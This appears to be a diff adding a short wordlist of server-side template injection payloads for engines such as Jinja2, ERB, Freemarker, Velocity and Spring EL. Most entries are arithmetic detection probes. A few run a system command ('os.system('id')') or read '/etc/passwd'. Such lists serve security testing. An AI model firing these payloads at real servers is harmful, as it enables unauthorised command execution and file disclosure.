@@ -1,0 +1,24 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{''.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+${7*7}
+${{7*7}}
+{{7*7}}
+a{*comment*}b
+{{namespace}}
+{{read(file)}}
+{% debug %}
+{% import os %}{{os.system('id')}}
+<%= File.read('/etc/passwd') %>
+${class.forName('java.lang.System').getProperty('user.dir')}
+${T(java.lang.System).getProperty('user.dir')}
+#set($x=1+1)${x}
+{{= 7*7 }}
